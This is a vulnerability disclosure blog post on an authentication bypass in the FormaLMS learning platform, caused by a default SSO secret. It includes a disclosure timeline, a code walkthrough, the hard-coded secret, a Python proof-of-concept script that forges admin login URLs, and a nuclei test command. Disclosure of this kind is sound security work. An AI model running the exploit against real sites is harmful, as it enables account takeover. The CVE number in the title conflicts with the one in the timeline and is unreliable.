---
title: "CVE-2023-4136 - FormaLMS The evil default value that leads to Authentication Bypass"
date: 2021-11-02
---

## Preface
As part of a recent research activity, we stumbled upon FormaLMS. The project is an open source Learning Management System built by forma.association and aimed at companies who want a learning platform for internal employees, partners, dealers and sellers.
The project is opensource and could be downloaded from the main website: formalms.org and the tested version is the 2.3.
Update: the exploit is working on version <= 2.4.4


## Responsible disclosure timeline
| Date	| Notes |
| ----  | ----- |
| 2021/10/02 | Vulnerability has been found |
| 2021/10/06 | Notification has been sent |
| 2021/10/21 | No answer. Sending second notification using the contact section of the website |
| 2021/11/02 | Public disclosure |
| 2021/11/09 | CVE-2021-43136 Assigned |



## Digging into the source
The application is written in PHP language and it uses custom routing logic to forward the requests to the specific controller. The architecture resemble the Model-View Controller one in a weird way and the requests are routed through the "front controller", which is the index.php file located in the root of the project.


## The routing mechanism
Once received, the front controller is responsible to parse the requested route via the r query string parameter, split the string by / and determine which controller and module to load (the green rectangle).
![Routing mechanism](/formalms/image-45.png)

A quick analysis on the `_homepage_base_` and `_homepagecatalog_base_` constants shows these values:
![Constants](/formalms/image-46.png)

So we can now reconstruct the routing mechanism:
- First part of the r parameter is the controller name (the red mark)
- Second part is the module name (green mark)
- Third part is the method name (orange mark)
- A "Controller" static suffix is appended at the end (yellow mark)

![MVC logics](/formalms/image-47.png)

## The authorization mechanism
While it is obvious that the routing mechanism allows every user to arbitrarily call any class, the authorization mechanism denies some actions to the administrative part of the application such as the `AdminrulesAdmController` file.

![ACL 1](/formalms/image-48.png)
![ACL 2](/formalms/image-49.png)
![ACL 3](/formalms/image-50.png)

So, in summary:
- The front controller, index.php, instantiate a new class based on the r input parameter and calls a constructor with the mvc name.
- The destination class, AdminrulesAdmController in this case, which extends the AdmController and is a subclass of the Controller class, calls a constructor with the mvc name and, afterwards, the init function
- The init() function of the "AdmController" is called and the checkRole() and checkPerms() are invoked based on the definition of the CORE constant, which is declared in various points of the code base.

## The vulnerability
While we had no luck trying to circumvent the authorization mechanism, one part of the index.php front controller caught my attention.
![front controller](/formalms/image-51.png)

Apparently, if the parameters login_user, time and token are passed to the query string, the application flows to a different location defined in the `_sso_` constant:
![sso constant flow](/formalms/image-52.png)


And, lastly, the part that clearly helped us to find the bug:
![bugged code](/formalms/image-53.png)

While it looks like that the developers were aware of this ugly default value ("orribile questo default" translates to "This is an horrible default value"), this was the part that motivated us to investigate further.


## Digging into the SSO function
Until now, we know that in order to access the sso functionality, the sso_token setting should be enabled.
The "sso" setting is present in the admin section of the website and, as shown in the screenshots above, it accepts a NULL value for the secret parameter.

![admin panel](/formalms/image-54.png)

## Exploiting the flaw
Knowing this, it is just a matter of sending an HTTP request on the index.php which contains:
- **login_user**: the target username
- **time**: the expiration of the session in epoch format. Adding some time will be useful to circumvent the expiration check
- **token**: calculated like the following:
```php
$recalc_token = strtoupper(md5($login_user . ',' . $time . ',' . $secret));
```
- **sso_secret**: the default value, which is: 8ca0f69afeacc7022d1e589221072d6bcf87e39c or, in some cases, empty if the value of SSO secret for the token hash is set to empty.


Following a simple PoC script that automates the process:​
```python
#!/usr/bin/env python
import sys
import time
import hashlib


secret = "8ca0f69afeacc7022d1e589221072d6bcf87e39c"

def help():
  print(f"Usage: {sys.argv[0]} username target_url")
  sys.exit()

if len(sys.argv) < 3:
    help()

user, url = (sys.argv[1], sys.argv[2])


t = str(int(time.time()) + 5000)
token = hashlib.md5(f"{user},{t},{secret}".encode()).hexdigest().upper()
final_url = f"{url}/index.php?login_user={user}&time={t}&token={token}"
print(f"URL with default secret: {final_url}")

token = hashlib.md5(f"{user},{t},".encode()).hexdigest().upper()
final_url = f"{url}/index.php?login_user={user}&time={t}&token={token}"
print(f"URL with empty secret: {final_url}")
```


And, finally, the bypass:
![bypass](/formalms/image-55.png)


## Nuclei template
Following a nuclei template, which could be useful for testing the vulnerability on single/multiple targets.
**Note**: the exploit uses blank value for the SSO Secret value, feel free to change it accordingly
The exploit needs environment variables in order to generate correct time in epoch format and token.
```sh
time=$(date -d "20 minutes" +"%s"); token=$(echo -n "admin,$time," | md5sum | cut -d ' ' -f 1);  ~/nuclei/v2/nuclei -u http://localhost:8085/formalms/ -t ~/nuclei-templates/vulnerabilities/formalms/formalms-auth-bypass.yaml -var login_user=admin -var time=$time -var token=$token -debug -v
```

